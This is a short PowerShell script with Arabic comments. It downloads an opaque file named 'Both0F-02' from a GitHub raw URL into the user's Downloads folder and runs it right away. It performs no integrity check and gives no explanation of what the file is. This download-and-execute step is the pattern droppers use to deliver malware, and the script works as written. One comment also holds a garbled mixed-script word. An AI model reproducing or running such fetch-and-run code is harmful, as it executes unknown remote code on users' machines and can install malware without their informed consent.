# عنوان URL المباشر للملف على GitHub
$url = "https://github.com/Mouted/Hos/raw/main/Both0F-02"

# المسار الذي سيتم حفظ الملف فيه على جهازك (في مجلد التنزيلات )
$destination = "$env:USERPROFILE\Downloads\Both0F-02"

# رسالة للمستخدم
Write-Host "بدء تنزيل الملف من الرابط..."

# تنزيل الملف
Invoke-WebRequest -Uri $url -OutFile $destination

# رسالة للمستخدم
Write-Host "اكتمل التنزيل. سيتم الآن تشغيل الملف..."

# تشغيل الملف الذي تم تنزile
Start-Process -FilePath $destination

# رسالة للمستخدم
Write-Host "تم تشغيل الملف بنجاح."
